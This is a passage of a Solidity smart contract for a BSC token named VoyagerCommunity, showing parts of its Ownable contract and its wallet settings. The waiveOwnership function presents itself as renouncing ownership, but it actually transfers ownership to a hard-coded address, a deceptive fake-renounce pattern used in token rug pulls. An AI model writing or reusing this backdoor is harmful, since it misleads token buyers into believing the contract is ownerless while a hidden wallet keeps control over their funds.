...
/** 
    https://t.me/VoyagerCommunityBSC
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x10416c99A8a5FE165bdd7C3e57a9Bd32D58FfDFE));
        _owner = address(0x10416c99A8a5FE165bdd7C3e57a9Bd32D58FfDFE);
    }
...
contract VoyagerCommunity is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "VoyagerCommunity";
    string private _symbol = "VOYAGER";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x20c66cF7e3705bB249F6444A13106E1BB5190aE5);
    address payable public teamWalletAddress = payable(0x20c66cF7e3705bB249F6444A13106E1BB5190aE5);
